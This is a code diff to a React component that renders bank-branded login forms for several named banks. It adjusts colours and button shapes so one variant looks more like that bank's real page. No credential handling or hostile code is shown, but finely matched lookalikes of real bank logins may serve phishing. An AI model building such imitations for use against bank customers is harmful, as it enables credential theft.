@@ -622,7 +622,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     </div>
                   )}
                   <div className="flex border-b border-gray-200 mb-6">
-                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : (isWarburg || isQlick || isRenault) ? "text-[#003366] border-[#003366]" : isMarcard ? "border-current" : "text-gray-600 border-gray-600"}`} style={isMarcard ? { color: theme.buttonBg, borderColor: theme.buttonBg } : isRenault ? { color: "#000000", borderBottomColor: "#000000" } : undefined}>
+                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : (isWarburg || isQlick || isRenault) ? "text-[#003366] border-[#003366]" : isMarcard ? "border-current" : "text-gray-600 border-gray-600"}`} style={isMarcard ? { color: theme.buttonBg, borderColor: theme.buttonBg } : isRenault ? { color: "#000000", borderBottomColor: "#000000" } : isWarburg ? { color: "#003366", borderBottomColor: "#003366" } : undefined}>
                       Mit Zugangsdaten anmelden
                     </button>
                   </div>
@@ -737,7 +737,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     style={{ 
                       borderColor: (isGLS || isQlick || isRenault) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText, 
                       color: (isGLS || isQlick || isRenault) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText,
-                      borderRadius: (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "0px" : buttonBorderRadius
+                      borderRadius: (isGLS || isMarcard || isQlick || isRenault) ? "0px" : isWarburg ? "9999px" : buttonBorderRadius
 
                     }}
 
@@ -751,7 +751,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
                     style={{ 
                       backgroundColor: (isGLS || isQlick) ? "#003366" : isWarburg ? "#6d7e8b" : isRenault ? "#edee00" : theme.buttonBg,
-                      borderRadius: (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "0px" : buttonBorderRadius,
+                      borderRadius: (isGLS || isMarcard || isQlick || isRenault) ? "0px" : isWarburg ? "9999px" : buttonBorderRadius,
                       color: isRenault ? "#000000" : "#ffffff",
 
 
